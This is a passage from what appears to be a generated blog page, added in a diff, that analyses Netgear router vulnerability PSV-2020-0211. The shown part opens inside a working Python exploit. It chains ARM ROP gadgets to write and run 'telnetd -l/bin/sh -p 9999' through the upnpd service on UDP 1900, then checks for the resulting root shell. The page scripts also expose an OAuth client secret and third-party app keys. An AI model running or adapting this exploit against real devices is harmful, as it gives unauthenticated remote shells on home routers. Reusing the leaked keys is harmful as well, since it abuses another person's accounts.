&apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+10) #R4</span><br><span class="line">    expayload += p32(0x4704A) #R5  //telnetd\x20-l</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+11) #R4</span><br><span class="line">    expayload += p32(0x04C281) #R5  //telnetd\x20-l/bin/\x20</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+16) #R4</span><br><span class="line">    expayload += p32(0x40CEC) #R5  //telnetd\x20-l/bin/</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+18) #R4</span><br><span class="line">    expayload += p32(0x9CB5) #R5  //telnetd\x20-l/bin/sh</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+22) #R4</span><br><span class="line">    expayload += p32(0x41B17) #R5  //telnetd\x20-l/bin/sh\x20-p\x20</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+24) #R4</span><br><span class="line">    expayload += p32(0x03FFC4) #R5  //telnetd\x20-l/bin/sh\x20-p\x2099</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+26) #R4</span><br><span class="line">    expayload += p32(0x03FFC4) #R5  //telnetd\x20-l/bin/sh\x20-p\x209999</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+28) #R4</span><br><span class="line">    expayload += p32(0x4A01D) #R5  //telnetd\x20-l/bin/sh\x20-p\x209999\x20&amp;</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase+30) #R4</span><br><span class="line">    expayload += p32(0x461C1) #R5  //telnetd\x20-l/bin/sh\x20-p\x209999\x20&amp;\x20\x00</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x13648) #strcpy</span><br><span class="line"></span><br><span class="line">    print &quot;[*] Make Payload ...&quot;</span><br><span class="line"></span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    .text:0001A83C                 MOV             R0, R4  ; command</span><br><span class="line">    .text:0001A840                 BL              system</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    expayload += &apos;d&apos;*0x5c#dummy</span><br><span class="line">    expayload += p32(bssBase) #R4</span><br><span class="line">    expayload += p32(0x47398) #R5</span><br><span class="line">    expayload += &apos;c&apos;*4 #R6</span><br><span class="line">    expayload += &apos;c&apos;*4 #R7</span><br><span class="line">    expayload += &apos;c&apos;*4 #R8</span><br><span class="line">    expayload += &apos;d&apos;*4 #R10</span><br><span class="line">    expayload += p32(0x1A83C) #system(string) telnetd -l</span><br><span class="line">    return expayload</span><br><span class="line"></span><br><span class="line">def conn(ip):</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    s.connect((ip, 1900))</span><br><span class="line">    return s</span><br><span class="line">    print &quot;[*] Send Proof Of Concept payload&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def checkExploit(ip):</span><br><span class="line">    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    try:</span><br><span class="line">        ret = soc.connect((ip,9999))</span><br><span class="line">        return 1</span><br><span class="line">    except:</span><br><span class="line">        return 0</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    ip = sys.argv[1]</span><br><span class="line">    libc_addr = sys.argv[2]</span><br><span class="line">    banner()</span><br><span class="line">    payload1 = makpayload1()</span><br><span class="line">    payload2 = makpayload2(libc_addr)</span><br><span class="line">    s = conn(ip)</span><br><span class="line">    s.send(&apos;a\x00&apos;+payload1) #expayload is rop gadget</span><br><span class="line">    s.send(payload2)</span><br><span class="line">    time.sleep(5)</span><br><span class="line">    if checkExploit(ip):</span><br><span class="line">        print &quot;[*] Exploit Success&quot;</span><br><span class="line">        print &quot;[*] You can access telnet %s 9999&quot;%ip</span><br><span class="line">    else:</span><br><span class="line">        print &quot;[*] Need to Existed Address cross each other&quot;</span><br><span class="line">        print &quot;[*] You need to reboot or execute upnpd daemon to execute upnpd&quot;</span><br><span class="line">        print &quot;[*] To exploit reexecute upnpd, description&quot;</span><br><span class="line">        print &quot;[*] Access http://%s/debug.htm and enable telnet&quot;%ip</span><br><span class="line">        print &quot;[*] then, You can access telnet. execute upnpd(just typing upnpd)&quot;</span><br><span class="line">    s.close()</span><br><span class="line">    print &quot;&quot;&quot;\n[*] Done ...\n&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/Wechatpay.png" alt="Cool-Y 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/Alipay.png" alt="Cool-Y 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/01/08/dolphin-attack-practice/" rel="next" title="Dolphin Attack 论文复现">
+                <i class="fa fa-chevron-left"></i> Dolphin Attack 论文复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      
+        <div id="gitment-container"></div>
+      
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.png" alt="Cool-Y">
+            
+              <p class="site-author-name" itemprop="name">Cool-Y</p>
+              <p class="site-description motion-element" itemprop="description">没人比我更懂中医#MAGA</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">27</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">48</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Cool-Y" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:cool.yim@whu.edu.cn" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.instagram.com/yan__han/" target="_blank" title="Instagram">
+                      
+                        <i class="fa fa-fw fa-instagram"></i>Instagram</a>
+                  </span>
+                
+            </div>
+          
+
+          <div id="music163player">
+                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=4&id=334277093&auto=1&height=430"></iframe>
+          </div>
+
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Netgear-栈溢出漏洞-PSV-2020-0211"><span class="nav-text">Netgear_栈溢出漏洞_PSV-2020-0211</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-漏洞概要"><span class="nav-text">0x00 漏洞概要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-威胁范围"><span class="nav-text">0x01 威胁范围</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Qemu模拟"><span class="nav-text">0x02 Qemu模拟</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#firmadyne"><span class="nav-text">firmadyne</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Qemu自定义"><span class="nav-text">Qemu自定义</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-静态分析"><span class="nav-text">0x03 静态分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-动态调试"><span class="nav-text">0x04 动态调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-漏洞利用"><span class="nav-text">0x05 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-脚本使用说明"><span class="nav-text">0x06 脚本使用说明</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Cool-Y</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+    <span title="Site words total count">99.1k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+<!-- LOCAL: You can save these files to your site and update links -->
+    
+        
+        <link rel="stylesheet" href="https://jjeejj.github.io/css/gitment.css">
+        <script src="https://jjeejj.github.io/js/gitment.js"></script>
+    
+<!-- END LOCAL -->
+
+    
+
+    
+      <script type="text/javascript">
+      function renderGitment(){
+        var gitment = new Gitment({
+            id: window.location.pathname,
+            owner: 'Cool-Y',
+            repo: 'gitment-comments',
+            
+            oauth: {
+            
+            
+                client_secret: '1c5db4da72df5e6fc318d12afe5f4406f7c54343',
+            
+                client_id: '180955a2c3ae3d966d9a'
+            }});
+        gitment.render('gitment-container');
+      }
+
+      
+      renderGitment();
+      
+      </script>
+    
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("EWwoJgHNdlj6iBjiFlMcabUO-gzGzoHsz", "x8FxDrYG79C8YFrTww9ljo8K");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
